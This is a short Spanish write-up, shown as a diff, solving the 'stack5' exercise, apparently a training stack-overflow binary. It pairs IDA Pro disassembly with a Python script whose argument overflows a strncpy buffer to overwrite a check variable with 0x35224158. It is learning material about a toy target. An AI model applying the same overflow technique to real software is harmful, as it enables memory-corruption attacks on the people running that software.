@@ -1,0 +1,71 @@
+﻿Stack5 by k0ch // 22 junio 2016
+
+Entorno: Windows 7 32bits
+
+En este caso analicé el stack5.idb con IDA PRO 6.8. 
+
+.text:00401087 cmp     [ebp+arg_0], 2 <--- arg_0 es el "int argc" de C/C++
+.text:0040108B jz      short loc_401095
+
+Para pasar a la sección de código que nos interesa, debemos pasarle al ejecutable al menos 2 argumentos. El primero siempre corresponderá al nombre del ejecutable.
+
+.text:00401095 loc_401095:
+.text:00401095 lea     eax, [ebp+var_4]
+.text:00401098 mov     dword_403020, eax
+.text:0040109D lea     ecx, [ebp+var_8]
+.text:004010A0 push    ecx
+.text:004010A1 lea     edx, [ebp+var_4]
+.text:004010A4 push    edx
+.text:004010A5 lea     eax, [ebp+var_3C]
+.text:004010A8 push    eax
+.text:004010A9 push    offset aBuf08xCookie08 ; "buf: %08x cookie: %08x cookie2: %08x\n"
+.text:004010AE call    sub_401150
+.text:004010B3 add     esp, 10h
+.text:004010B6 push    3Ch             ; Count
+.text:004010B8 mov     ecx, 4
+.text:004010BD imul    edx, ecx, 0
+.text:004010C0 mov     eax, [ebp+arg_4]
+.text:004010C3 mov     ecx, [eax+edx]
+.text:004010C6 push    ecx             ; Source
+.text:004010C7 lea     edx, [ebp+Dest]
+.text:004010CD push    edx             ; Dest
+.text:004010CE call    ds:strncpy
+.text:004010D4 add     esp, 0Ch
+.text:004010D7 push    0A0h            ; Count
+.text:004010DC mov     eax, 4
+.text:004010E1 shl     eax, 0
+.text:004010E4 mov     ecx, [ebp+arg_4] 
+.text:004010E7 mov     edx, [ecx+eax]
+.text:004010EA push    edx             ; Source
+.text:004010EB lea     eax, [ebp+var_3C]
+.text:004010EE push    eax             ; Dest
+.text:004010EF call    ds:strncpy <-- Acá podemos observar que el segundo argumento se copia a var_3C (buf). A través de esta podemos pisar el valor de var_4, la cual será necesaria para pasar la comparación de la línea 0040111C
+
+.text:004010F5 add     esp, 0Ch
+.text:004010F8 mov     ecx, [ebp+var_8]
+.text:004010FB push    ecx
+.text:004010FC mov     edx, dword_403020
+.text:00401102 push    edx
+.text:00401103 call    sub_401010
+.text:00401108 add     esp, 8
+.text:0040110B mov     eax, [ebp+var_4]
+.text:0040110E push    eax
+.text:0040110F push    offset aCookie08x ; "cookie %08x \n"
+.text:00401114 call    sub_401150
+.text:00401119 add     esp, 8
+.text:0040111C cmp     [ebp+var_4], 35224158h <-- comparación para ganar! :)
+.text:00401123 jnz     short loc_
+
+El script resultante es este:
+
+//---------------------
+
+import subprocess
+
+args = 'stack5.exe ' + 56 * 'x' + 'XA\\"5'
+subprocess.call(args)
+
+//---------------------
+
+SEE YOU SPACE COWBOY :)
+..k0ch
